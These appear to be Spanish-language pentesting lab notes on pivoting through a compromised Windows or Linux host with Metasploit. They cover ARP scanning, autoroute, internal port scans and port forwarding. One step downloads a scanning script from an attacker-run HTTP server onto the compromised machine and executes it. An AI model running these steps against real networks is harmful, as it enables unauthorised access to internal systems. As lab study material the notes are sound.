
---

### Mapa de Red

Un mapa de red es una representación visual de los componentes y la conectividad de una red, mostrando cómo interactúan entre sí los dispositivos, cables, puertos y otros elementos físicos o lógicos Se utiliza para la gestión, el mantenimiento, la identificación de problemas y la planificación de crecimiento de la red

![[Pasted image 20251023155942.png]]

---

#### Pivoting en Maquina Intermedia Windows 

Para visualizar las interfaces de red que posee una maquina podemos aplicar los siguientes comandos:

```bash
ifconfig # Linux y sesion de Meterpreter
ipconfig # Windows
```

- Se recomienda siempre estar en meterpreter ya que nos facilita el pivoting de maquinas:

```bash
background   # Colocamos la sesion en segundo plano, tambien podemos con Ctrl + Z
sessions -l  # Para ver que sesiones tenemos o tambien podemos usar el comandos show sessions
use windows/gather/arp_scanner # Modulo que nos ayuda a buscar que equipos hay en la red interna 
show options
set SESSION 1   # seteamos el id de la Sesion que dejamos en background
set RHOSTS 10.10.10.128/24  # Seteamos la ip de la interfaz de red interna y ademas su mascara de red para que escanee toda la red 
run 

# Esto nos arrojara todos los dispositivos que escanee en esa red de los cuales debemos elegir los que mejor tengan coincidencia en el numero de ip 

# Un ejemplo del escaneo podria ser 

- **10.10.10.1** — gateway/DHCP del VMnet (router virtual).
    
- **10.10.10.128** — tú (Nuestra Maquina).
  
- **10.10.10.129** - Maquina victima
      
- **10.10.10.255** — dirección de broadcast de la subred (no es un host).
    
- **10.10.10.254** — interfaz del host/otro adaptador virtual (MAC VMware), no una VM víctima.
  
```

- Cuando encontremos el objetivo a atacar haremos lo siguiente:

```bash
use multi/manage/autoruote  # Modulo para hacer el enrutamiento del trafico
show options
set SESSION 1    # Seteamos la sesion que tenemos en background
run              # Ya tendriamos el trafico de la red interna
```

- Ahora procederíamos a realizar un escaneo de puertos de la red interna:

```bash
use scanner/portscan/tcp    # Modulo de escaneo de puertos
show options
set RHOSTS 10.10.10.129    # Ip de la maquina victima de la red interna
run
```

- Luego de la ejecución veríamos algo como lo siguiente donde nos mostraría los puertos de la red interna de la maquina victima: 

![[Pasted image 20251023165543.png]]


*Modulo solo si el pivoting es en windows*

```bash
use post/windows/manage/portproxy     # Modulo para realizar el port forwarding
show options
set CONNECT_ADDRESS 10.10.10.129  # Ip de la maquina victima de la red interna
set CONNECT_PORT 80               # Puerto que queremos atacar de la maquina victima en la red interna
set LOCAL_ADDRESS 0.0.0.0         # Siempre se pone eso  referenciando a la ip de la maquina en la que estamos (windows 7)
set LOCAL_PORT 5000               # Ejecutamos el portforwarding diciendo que queremos que el puerto 80 de la maquina victima sea el puerto                                         5000 de nuestra maquina atacante
set SESSION 1                     # Seteamos la session que teniamos en background
run 
```

*Asi se mostraria el resultado del portfowarding*

![[Pasted image 20251023170459.png]]

- Accedemos a la pagina web de la siguiente forma:

```bash
http://192.168.1.24:5000    # Accedemos mediante la ip de la maquina intermedia y el puerto del port forwading 
```

*El portforwarding lo hacemos con la maquina intermediaria, es decir a la hora de probar o atacar un puerto lo obtenemos de la ip intermediaria*

---

#### Pivoting mediante maquina intermedia Linux

- *No se puede hacer pivoting sin antes ser root*

- Procedemos a enrutar el trafico

```bash
use multi/manage/autoroute  # Modulo para hacer el enrutamiento del trafico
show options
set SESSION 1    # Seteamos la sesion que tenemos en background
run              # Ya tendriamos el trafico de la red interna

route            # Con este comando podemos ver la ruta de enrutamiento
```

- Lo que haremos después para hacer un escaneo de los equipos de la red interna sera crearnos el siguiente script en nuestra maquina atacante y posteriormente compartirlo con la maquina intermediaria levantando un servidor

```bash
nano escaner.sh
> 
	#!/bin/bash
	for i in {1..255}; do
	    timeout 1 bash -c "ping -c 1 10.10.10.$i" >/dev/null
	    if [ $? -eq 0 ]; then
	        echo "El host 10.10.10.$i está activo"                # Segun sea la Ip , pueden haber otras como 20.20.20.0
	    fi
	done
```

```bash
Atacante >
			python3 -m http.server 80
```

```bash
Intermediaria >
				wget http://<IpAtacante>/escaner.sh
				chmod +x escaner.sh
				./escaner.sh
```

- Nos tendría que aparecer de esta forma, dándonos los host vulnerables: 

![[Pasted image 20251023194006.png]]

- Ahora procederíamos a realizar un escaneo de puertos de la red interna:

```bash
use scanner/portscan/tcp    # Modulo de escaneo de puertos
show options
set RHOSTS 10.10.10.129    # Ip de la maquina victima de la red interna
run
```

- Realizamos el portforwarding del puerto que queramos de la siguiente manera:

```bash
sessions -i 1    # Volvemos a la sesion que teniamos 

meterpreter >
			portfwd add -l <PuertoIntermediario> -p <PuertoRedInterna> -r <IpvictimaInterna>  # Hacemos el port Forwarding a nuestra maquina                local de atacante no a la maquina intermediaria
			
		   #portfwd add -l 2222 -p 22 -r 10.10.10.130 
```

*El portforwarding lo hacemos con nuestra maquina local, es decir a la hora de probar o atacar un puerto lo obtenemos de 127.0.0.1*

